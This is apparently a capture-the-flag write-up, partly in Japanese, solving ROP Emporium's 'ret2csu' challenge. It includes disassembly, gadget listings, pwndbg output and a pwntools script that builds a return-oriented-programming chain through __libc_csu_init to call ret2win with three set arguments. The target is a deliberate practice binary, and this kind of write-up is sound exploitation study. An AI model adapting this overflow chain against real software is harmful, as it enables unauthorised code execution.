# ret2csu (ROP Emporium 8)

## Information

### ret2win
```asm
00000000000009d3 <ret2win>:
 9d3:	55                   	push   rbp
 9d4:	48 89 e5             	mov    rbp,rsp
 9d7:	48 83 ec 30          	sub    rsp,0x30
 9db:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
 9df:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
 9e3:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
 9e7:	48 c7 45 f0 00 00 00 	mov    QWORD PTR [rbp-0x10],0x0
 9ee:	00 
 9ef:	48 b8 ef be ad de ef 	movabs rax,0xdeadbeefdeadbeef
 9f6:	be ad de 
 9f9:	48 39 45 e8          	cmp    QWORD PTR [rbp-0x18],rax
 9fd:	0f 85 d7 00 00 00    	jne    ada <ret2win+0x107>
 a03:	48 b8 be ba fe ca be 	movabs rax,0xcafebabecafebabe
 a0a:	ba fe ca 
 a0d:	48 39 45 e0          	cmp    QWORD PTR [rbp-0x20],rax
 a11:	0f 85 c3 00 00 00    	jne    ada <ret2win+0x107>
 a17:	48 b8 0d f0 0d d0 0d 	movabs rax,0xd00df00dd00df00d
 ...
```
引数が
1. rdi: 0xdeadbeefdeadbeef
2. rsi: 0xcafebabecafebabe
3. rdx: 0xd00df00dd00df00d

である必要がある

### gadget
pop系
```asm
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006a0 : pop r14 ; pop r15 ; ret
0x00000000004006a2 : pop r15 ; ret
0x0000000000400604 : pop rbp ; jmp 0x400590
0x000000000040057b : pop rbp ; mov edi, 0x601038 ; jmp rax
0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x00000000004006a3 : pop rdi ; ret
0x00000000004006a1 : pop rsi ; pop r15 ; ret
0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```
rdi, rsiはあるが，rdxがない

### csu
```asm
40069a:	5b                   	pop    rbx
40069b:	5d                   	pop    rbp
40069c:	41 5c                	pop    r12
40069e:	41 5d                	pop    r13
4006a0:	41 5e                	pop    r14
4006a2:	41 5f                	pop    r15
4006a4:	c3                   	ret

400680:	4c 89 fa             	mov    rdx,r15
400683:	4c 89 f6             	mov    rsi,r14
400686:	44 89 ef             	mov    edi,r13d
400689:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
40068d:	48 83 c3 01          	add    rbx,0x1
400691:	48 39 dd             	cmp    rbp,rbx
400694:	75 ea                	jne    400680 <__libc_csu_init+0x40>
400696:	48 83 c4 08          	add    rsp,0x8
40069a:	5b                   	pop    rbx
...
```

## Solution
1. pop rdi with 0xdeadbeefdeadbeef
2. 0x40069a with rbx=0, rbp=0, r12=0x601020(ret2win@got), r13=0xdeadbeaf(edi), r14=0xcafebabecafebabe(rsi), r15=0xd00df00dd00df00d(rdx)
3. 0x400680 

rdiを変えなきゃいけない -> callが戻ってきた後のretまで実行させたい
-> callでrdxに影響のないfiniに飛ばす

rbp = rbx + 1にすべき

### fini addr
```
pwndbg> search -t qword 0x4006b4
Searching for an 8-byte integer: b'\xb4\x06@\x00\x00\x00\x00\x00'
ret2csu         0x4003b0 mov ah, 6
ret2csu         0x400e48 mov ah, 6
ret2csu         0x6003b0 0x4006b4 (_fini)
ret2csu         0x600e48 0x4006b4 (_fini)
warning: Unable to access 16007 bytes of target memory at 0x7ffff7a01000, halting search.
pwndbg> hexdump 0x6003b0
+0000 0x6003b0  b4 06 40 00 00 00 00 00  00 00 00 00 00 00 00 00  │..@.....│........│
+0010 0x6003c0  00 6c 69 62 72 65 74 32  63 73 75 2e 73 6f 00 5f  │.libret2│csu.so._│
+0020 0x6003d0  5f 67 6d 6f 6e 5f 73 74  61 72 74 5f 5f 00 70 77  │_gmon_st│art__.pw│
+0030 0x6003e0  6e 6d 65 00 5f 69 6e 69  74 00 72 65 74 32 77 69  │nme._ini│t.ret2wi│
```

### Strategy New
1. 0x40069a with rbx=0, rbp=1, r12=0x6003b0(&fini), r13=0x0(edi), r14=0xcafebabecafebabe(rsi), r15=0xd00df00dd00df00d(rdx)
2. 0x400680  
3. 0x0 (add rsp 0x8のmargin) + 0x0(rbx) + 0x0(rbp) + 0x0(r12) + 0x0(r13) + 0x0(r14) + 0x0(r15)
4. pop rdi with 0xdeadbeefdeadbeef
5. 0x400510

### Script
```python
from pwn import *

elf = ELF("./ret2csu")
rop = ROP(elf)

payload = b'a'*0x28
payload += p64(0x40069a)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(0x6003b0)
payload += p64(0x0)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400680)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(rop.rdi.address)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0x400510)

conn=process("./ret2csu")

conn.sendlineafter("> ", payload)

conn.interactive()
```